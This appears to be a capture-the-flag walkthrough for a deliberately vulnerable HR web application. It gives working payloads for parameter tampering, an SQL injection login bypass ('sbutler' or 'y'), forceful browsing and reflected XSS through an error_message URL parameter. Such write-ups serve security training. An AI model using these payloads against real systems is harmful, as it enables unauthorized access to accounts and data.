# Human Resources

## Getting in

To make your way to the HR panel, inspect the source code and uncomment the test form
```HTML
<form action="/HumanResources/auth/testLogin" method="post" enctype="multipart/form-data">
  	      <input type="submit" class="button right expand" value="Login as Test" />
        </form>
```

## Data tampering

Tampering was probably the most common vulnerability on this website. Here are some examples:

- Unauthorized Addition of a User to a Project via Form Input Tampering  
- Unauthorized User Management via Path Parameter Tampering

On the Manage tab, submit a form, changing the user value and project id.
```
POST /HumanResources/manage/users/30/projects HTTP/1.1
projectId=11
```
- Alter Time Off Request Status via Hidden Form Field Tampering

Every new Time off request is 'pending' by default. You can change the status value in the request.

```
POST /HumanResources/timeOff/create HTTP/1.1
start_date=2017%2F11%2F30&end_date=2017%2F12%2F14&status=approved
```
## Injection
### SQLi

There is a list of employees in the administration panel, we can grab some usernames and login through the other user.

- SQL Injection Against Login Page for Authentication Bypass
```
username: sbutler' or 'y
password: whatever
```
After log in as another (unprivileged user), we can forcefully browse to the previously known directories from admin panel.

- Gain Unauthorized Access to HR Staff Page via Forceful Browsing
- Forceful Browsing to Manager Portal
- Generate Employee Report Without Being Authenticated as a Manager
- and more...

### XSS

When submitting forms, you will occasionally get success/error messages. The url would look something like this ```login?error_message=Invalid Credentials```

Simple XSS achieves the following flags:

- Cross-Site Scripting Against Login Page
- Cross-Site Scripting Against an HR Staff Users Page
- Cross-Site Scripting Against Home Page
- Cross-Site Scripting On Timesheet Page

```html
/login?error_message=<img src="x" onerror="alert(1337)"/>
or
/login?error_message=<img src="javascript:alert(1337)"/>
```

## Misc

Web Crawler was useful.

- Discovering Navbar Manager Portal Button Hidden with CSS

Navigate to ```/manager``` folder
